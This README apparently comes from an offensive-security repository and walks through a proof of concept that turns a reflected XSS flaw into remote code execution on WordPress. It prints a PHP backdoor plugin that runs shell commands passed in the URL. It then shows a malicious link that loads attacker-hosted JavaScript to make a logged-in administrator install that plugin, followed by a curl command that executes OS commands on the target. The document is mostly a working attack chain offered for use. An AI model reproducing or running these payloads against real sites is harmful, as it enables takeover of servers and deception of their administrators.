# [RCE] Install Plugin

## Test Environment

### Web Browsers (20240224)

* [x] Mozilla Firefox Version 123.0 (64-bit)
* [x] Google Chrome Version 122.0.6261.70 (64-bit)
* [x] Microsoft Edge Version 122.0.2365.52 (64-bit)

## Exploitation Steps
1. [create backdoored CMS module] backdoor source code

    * **NOTE**: update/customize PHP backdoor in `WP_PoC.php`

    (`WP_PoC.php`)

    ```
    <?php
    /**
     * Plugin Name: WP RCE PoC - Install Plugin
     * Version: 1.0.0
     * Author: WP Admin
     * Author URI: https://localhost
     * License: GPL2
     */
    if (md5($_GET['pass']) === '098f6bcd4621d373cade4e832627b4f6') { echo passthru($_GET['cmd']); }
    ?>
    ```

2. [create backdoored CMS module] create WordPress plugin

    ```
    zip WP_PoC.zip WP_PoC.php
    ```

3. [create backdoored CMS module] base64-encode generated plugin file (**NOTE**: avoids encoding issues)

    ```
    cat WP_PoC.zip | base64 -w0 > WP_PoC.txt
    ```

4. [setup exploit] change payload variable values (`installPluginWP.js`)

    `pluginURL` - URL of WordPress plugin (containing backdoor) to be installed on target site

    `wpRoot` - path to WordPress installation on the target system (e.g. `"/path"`)

5. [setup exploit] setup web server (to serve the payload/plugin)

6. [social engineering attack] victim user (with administrative privileges) logs in

    http://192.168.5.10/wp-login.php

7. [social engineering attack] victim user clicks link

    ```
    http://192.168.5.10/test/rxss.php?q=<script src=http://192.168.5.15/installPluginWP.js></script>
    ```

    * **NOTES**:
      * `192.168.5.10` - target WordPress site
      * `192.168.5.15` - web server hosting payload

8. [post exploit] execute OS command

    ```
    curl -s "http://192.168.5.10/wp-content/plugins/WP_PoC/WP_PoC.php?pass=test&cmd=id" | head -n 1
    ```

    * **NOTE**: module URL constructed based on name of installed module

9. [uninstall module] uninstall module via GUI

    *WordPress ➔ Plugins ➔ Installed Plugins ➔ [WP RCE PoC - Install Plugin] Delete ➔ OK*

## Screenshots

* **NOTE**: the screenshot covers steps 1 to 8 from the "Exploitation Steps" chapter

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CMS/WordPress/InstallPlugin/screenshots/WordPress_-_install_plugin_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CMS/WordPress/InstallPlugin/screenshots/WordPress_-_install_plugin_-_1-1.png">
    </picture>
  </kbd>
</p>

## Video

https://github.com/user-attachments/assets/e2a5fa16-2636-43f0-9761-f1c22b479263
